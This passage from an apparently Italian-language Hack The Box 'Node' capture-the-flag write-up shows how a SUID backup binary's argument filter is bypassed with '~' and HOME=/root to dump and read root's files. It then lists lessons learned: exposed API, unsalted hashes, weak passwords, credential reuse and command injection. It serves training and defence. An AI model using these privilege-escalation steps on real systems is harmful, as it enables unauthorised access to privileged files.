45010.c  creds.txt  hash.txt  myplace.backup  myplace.backup.zip.hash  myplace-decoded.backup  root  root-decoded  root.txt  var
┌──(root㉿kali)-[~kali/htb/node]
└─# cd root
┌──(root㉿kali)-[~kali/htb/node/root]
└─# ls
root.txt
┌──(root㉿kali)-[~kali/htb/node/root]
└─# cat root.txt
69b89412f7c64bcc159b823ac782a0eb
```


### 2st METOD USING THE HOME VARIABLE

Anche il carattere ~ non è filtrato, quindi possiamo usarlo per fare un backup della directory principale.

Innanzitutto, imposta la variabile d'ambiente $HOME su /root.

```bash
tom@node:/tmp$ export HOME=/root
```

ripetiamo la procedura  per avere il backup dandogli come argomento la ~ 
 
```bash
tom@node:/tmp$ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 "~" > root
tom@node:/tmp$ cat root | base64 --decode > root-decoded
tom@node:/tmp$ mkdir loot
tom@node:/tmp$ unzip root-decoded -d /tmp/loot
tom@node:/tmp$ unzip root-decoded -d /tmp/hack/
Archive:  root-decoded
   creating: /tmp/hack/root/
[root-decoded] root/.profile password:
  inflating: /tmp/hack/root/.profile
   creating: /tmp/hack/root/.cache/
 extracting: /tmp/hack/root/.cache/motd.legal-displayed
 extracting: /tmp/hack/root/root.txt
  inflating: /tmp/hack/root/.bashrc
  inflating: /tmp/hack/root/.viminfo
   creating: /tmp/hack/root/.nano/
 extracting: /tmp/hack/root/.nano/search_history
tom@node:/tmp$ cd hack/
tom@node:/tmp/hack$ ls
root
tom@node:/tmp/hack$ cd root/
tom@node:/tmp/hack/root$ ls
root.txt
tom@node:/tmp/hack/root$ cat root.txt
69b89412f7c64bcc159b823ac782a0eb
tom@node:/tmp/hack/root$
```


Gli ultimi due metodi ci hanno coinvolto sfruttando il file di backup in un modo che ci dà accesso a un file privilegiato. Non abbiamo davvero aumentato i nostri privilegi a root. ```




 
# LESSON LEARNED

Per ottenere un punto d'appoggio iniziale sulla scatola abbiamo sfruttato tre vulnerabilità.

1. Controllo degli accessi . L'endpoint API /users è stato esposto e ciò ci ha consentito di ottenere un elenco di credenziali senza avere alcun diritto di accesso. Sebbene il controllo dell'accesso venga eseguito su altri endpoint, gli sviluppatori devono essersi dimenticati di limitare l'accesso a questo endpoint. È necessario applicare un controllo di accesso adeguato a tutti gli endpoint API sensibili.

2. Credenziali di accesso deboli e implementazione dell'hashing non sicura. Siamo riusciti a decifrare le password che abbiamo trovato nel file degli utenti in pochi secondi. Ciò era dovuto a due motivi: (1) gli utenti avevano scelto password facili facilmente decifrabili e (2) le password non erano salate e quindi possono essere facilmente cercate in una tabella precalcolata (tabelle arcobaleno) per vedere se l'hash della password specificato corrisponde a uno qualsiasi degli hash nella tabella. Pertanto, per evitare ciò, gli sviluppatori dell'applicazione dovrebbero applicare politiche di password complesse agli utenti e utilizzare un salt durante l'hashing delle password degli utenti.

5. Credenziali di crittografia deboli. Il file di backup che abbiamo trovato era compresso e crittografato con una password debole. Gli amministratori avrebbero dovuto utilizzare una password sufficientemente lunga e non facilmente decifrabile.

6. Credenziali codificate e riutilizzo della password. Dopo aver decifrato la password nel file zippato, abbiamo trovato un file app.js che contiene credenziali hardcoded. Sebbene le credenziali fossero per mongodb, un servizio non esposto pubblicamente, l'utente ha utilizzato le stesse credenziali per il proprio account SSH. Questa vulnerabilità finale concatenata con le vulnerabilità sopra elencate ci ha permesso di ottenere l'accesso iniziale alla macchina. 

Per aumentare i privilegi abbiamo sfruttato due vulnerabilità.

1. Configurazione errata della sicurezza di app.js. Il file app.js veniva eseguito come attività pianificata dall'utente "tom", sebbene il file stesse eseguendo codice da mongodb utilizzando le credenziali di un utente con meno privilegi (contrassegno). Questo ci ha permesso di aumentare i nostri privilegi a "tom". Per evitare ciò, mark avrebbe dovuto essere il proprietario dell'attività pianificata.

2. Convalida dell'input dell'utente insufficiente nel file binario di backup. L'utente "tom" è stato configurato per essere nel gruppo admin e quindi disponeva dei diritti di esecuzione sul file binario di backup. Tuttavia, questo file binario aveva il bit suid impostato ed era di proprietà di root. Poiché gli argomenti della riga di comando non sono stati convalidati correttamente, siamo stati in grado di sfruttare un'iniezione di comandi per ottenere l'accesso a livello di root sul sistema. 
